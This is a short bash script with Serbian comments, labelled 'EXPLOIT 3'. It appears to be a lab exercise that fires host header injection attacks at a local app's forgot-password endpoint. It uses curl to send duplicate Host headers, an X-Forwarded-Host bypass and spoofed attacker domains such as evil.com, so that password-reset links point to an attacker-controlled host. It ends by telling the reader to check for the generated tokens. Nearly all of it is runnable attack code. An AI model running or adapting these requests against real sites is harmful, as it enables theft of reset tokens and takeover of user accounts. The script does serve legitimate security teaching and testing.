#!/usr/bin/env bash
# =============================================================
# EXPLOIT 3 – Napredne tehnike Host Header Injection-a
# =============================================================

TARGET="http://localhost:3000"
EMAIL="marko@example.com"

echo "=============================================="
echo " EXPLOIT 3: Napredne Host Header tehnike"
echo "=============================================="
echo ""

echo "[A] Dupli Host header:"
curl -s -o /dev/null -w "  HTTP %{http_code}\n" \
  -X POST "$TARGET/forgot-password" \
  -H "Host: localhost:3000" \
  -H "Host: evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$EMAIL"
echo ""

echo "[B] X-Forwarded-Host bypass (trust proxy=true je ukljucen):"
curl -s -o /dev/null -w "  HTTP %{http_code}\n" \
  -X POST "$TARGET/forgot-password" \
  -H "X-Forwarded-Host: attacker-via-proxy.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$EMAIL"
echo ""

echo "[C] Host sa malicioznim domenom i portom:"
curl -s -o /dev/null -w "  HTTP %{http_code}\n" \
  -X POST "$TARGET/forgot-password" \
  -H "Host: evil.com:3000" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$EMAIL"
echo ""

echo "[D] API endpoint sa laznim hostom:"
curl -s -H "Host: i-am-not-real.com" \
  "$TARGET/api/absolute-url?path=/profile/1"
echo ""
echo "[!] Proverite admin panel za sve generisane tokene."